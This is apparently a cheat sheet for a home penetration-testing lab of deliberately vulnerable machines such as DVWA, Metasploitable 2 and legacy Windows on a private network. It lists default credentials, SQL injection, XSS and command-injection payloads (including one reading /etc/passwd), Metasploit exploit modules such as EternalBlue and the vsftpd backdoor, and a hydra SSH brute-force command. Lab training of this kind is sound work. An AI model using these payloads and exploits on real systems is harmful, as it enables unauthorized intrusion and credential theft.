# Vulnerable Targets - Practice Configurations

## Target 1: DVWA (Damn Vulnerable Web Application)

### Configuration
- **IP:** 192.168.56.201
- **URL:** http://192.168.56.201
- **Credentials:** admin / password

### Vulnerabilities to Practice
1. **SQL Injection**
   - URL: http://192.168.56.201/vulnerabilities/sqli/
   - Payload: `' OR 1=1 --`
   - Tool: sqlmap

2. **Reflected XSS**
   - URL: http://192.168.56.201/vulnerabilities/xss_r/
   - Payload: `<script>alert('XSS')</script>`

3. **Stored XSS**
   - URL: http://192.168.56.201/vulnerabilities/xss_s/
   - Payload: `<script>alert('XSS')</script>`

4. **Command Injection**
   - URL: http://192.168.56.201/vulnerabilities/exec/
   - Payload: `; cat /etc/passwd`

5. **File Upload**
   - URL: http://192.168.56.201/vulnerabilities/upload/
   - Payload: PHP shell renamed to .jpg

6. **CSRF**
   - URL: http://192.168.56.201/vulnerabilities/csrf/
   - Payload: Malicious form

### Practice Commands
```bash
# SQL Injection with sqlmap
sqlmap -u "http://192.168.56.201/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx" --dbs

# XSS with Burp Suite
# Intercept request and modify parameters

# Manual Command Injection
curl "http://192.168.56.201/vulnerabilities/exec/?ip=;cat+/etc/passwd&Submit=Submit"
```

---

## Target 2: Metasploitable 2

### Configuration
- **IP:** 192.168.56.200
- **Credentials:**
  - FTP: msfadmin / msfadmin
  - SSH: msfadmin / msfadmin
  - MySQL: root / (empty)
  - Tomcat: tomcat / tomcat

### Exposed Services
| Port | Service | Vulnerability |
|--------|----------|----------------|
| 21 | FTP | vsftpd 2.3.4 backdoor |
| 22 | SSH | Brute force |
| 23 | Telnet | Weak credentials |
| 25 | SMTP | Open relay |
| 80 | HTTP | Multiple web vulns |
| 139 | SMB | Null session |
| 445 | SMB | EternalBlue (if Windows) |
| 3306 | MySQL | Weak credentials |
| 5432 | PostgreSQL | Weak credentials |
| 6667 | IRC | UnrealIRCd backdoor |
| 8180 | Tomcat | Manager default creds |

### Metasploit Exploits
```bash
# vsftpd Backdoor
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.200
exploit

# UnrealIRCd Backdoor
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.200
exploit

# Tomcat Manager
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.56.200
set USERNAME tomcat
set PASSWORD tomcat
exploit
```

---

## Target 3: OWASP BWA

### Configuration
- **IP:** 192.168.56.202
- **URL:** http://192.168.56.202

### Included Applications
1. **Mutillidae** - Multiple web vulnerabilities
2. **WebGoat** - Interactive security tutorial
3. **Juice Shop** - Modern web app vulnerabilities
4. **Node.js applications** - Server-side vulnerabilities
5. **PHP applications** - Legacy vulnerabilities

### Recommended Practices
```bash
# Scanning with Nikto
nikto -h http://192.168.56.202

# Directory brute-forcing
dirb http://192.168.56.202

# SQL Injection in Mutillidae
# Navigate to: http://192.168.56.202/mutillidae/
```

---

## Target 4: Windows XP/7 (Legacy)

### Configuration
- **IP:** 192.168.56.203
- **Credentials:** Administrator / (empty)

### Vulnerabilities
- **MS08-067** - NetAPI (Windows XP)
- **MS17-010** - EternalBlue (Windows 7)
- **MS09-050** - SMBv2 (Windows Vista/7)

### Metasploit Exploits
```bash
# MS08-067
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.56.203
exploit

# EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.203
set LHOST 192.168.56.100
exploit
```

---

## Target 5: Linux Server

### Configuration
- **IP:** 192.168.56.204
- **Credentials:** admin / admin

### Services
- Apache with vulnerable CGI
- SSH with weak keys
- FTP with anonymous access
- Samba with null session

### Practices
```bash
# SMB Enumeration
enum4linux -a 192.168.56.204

# CGI Exploitation
nikto -h http://192.168.56.204/cgi-bin/

# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.204
```